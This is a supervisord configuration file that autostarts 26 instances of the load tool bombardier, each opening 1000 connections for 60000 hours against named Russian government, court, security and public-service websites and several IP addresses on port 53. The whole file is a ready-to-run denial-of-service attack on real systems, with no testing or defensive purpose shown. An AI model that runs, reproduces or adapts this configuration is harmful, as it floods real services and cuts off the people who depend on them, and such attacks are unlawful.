# supervisord.conf
[supervisord]
nodaemon=true

[program:bombardier-0]
command=bombardier -c 1000 -d 60000h --http1 -l http://kremlin.ru
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-1]
command=bombardier -c 1000 -d 60000h --http1 -l http://duma.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-2]
command=bombardier -c 1000 -d 60000h --http1 -l http://president-sovet.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-3]
command=bombardier -c 1000 -d 60000h --http1 -l https://sovetnational.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-4]
command=bombardier -c 1000 -d 60000h --http1 -l https://www.gosuslugi.ru/ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-5]
command=bombardier -c 1000 -d 60000h --http1 -l https://zakupki.gov.ru/epz/main/public/home.html
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-6]
command=bombardier -c 1000 -d 60000h --http1 -l https://gossluzhba.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-7]
command=bombardier -c 1000 -d 60000h --http1 -l http://defence.council.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-8]
command=bombardier -c 1000 -d 60000h --http1 -l http://budget.council.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-9]
command=bombardier -c 1000 -d 60000h --http1 -l http://www.kremlin.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-10]
command=bombardier -c 1000 -d 60000h --http1 -l https://government.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-11]
command=bombardier -c 1000 -d 60000h --http1 -l http://www.scrf.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-12]
command=bombardier -c 1000 -d 60000h --http1 -l http://www.ksrf.ru/ru/Pages/default.aspx
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-13]
command=bombardier -c 1000 -d 60000h --http1 -l http://www.vsrf.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-14]
command=bombardier -c 1000 -d 60000h --http1 -l http://premier.gov.ru/events/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-15]
command=bombardier -c 1000 -d 60000h --http1 -l https://www.mchs.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-16]
command=bombardier -c 1000 -d 60000h --http1 -l https://minjust.gov.ru/ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-17]
command=bombardier -c 1000 -d 60000h --http1 -l http://www.fsb.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-18]
command=bombardier -c 1000 -d 60000h --http1 -l https://rosguard.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-19]
command=bombardier -c 1000 -d 60000h --http1 -l https://customs.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-20]
command=bombardier -c 1000 -d 60000h --http1 -l https://udprf.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-21]
command=bombardier -c 1000 -d 60000h --http1 -l http://favt.gov.ru/
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-22]
command=bombardier -c 1000 -d 60000h --http1 -l http://194.67.2.109:53/UDP
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-23]
command=bombardier -c 1000 -d 60000h --http1 -l http://194.67.7.1:53/UDP
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-24]
command=bombardier -c 1000 -d 60000h --http1 -l http://194.54.14.187:53/UDP
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

[program:bombardier-25]
command=bombardier -c 1000 -d 60000h --http1 -l http://194.54.14.186:53/UDP
user=nobody
autostart=true
startsecs=0
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0

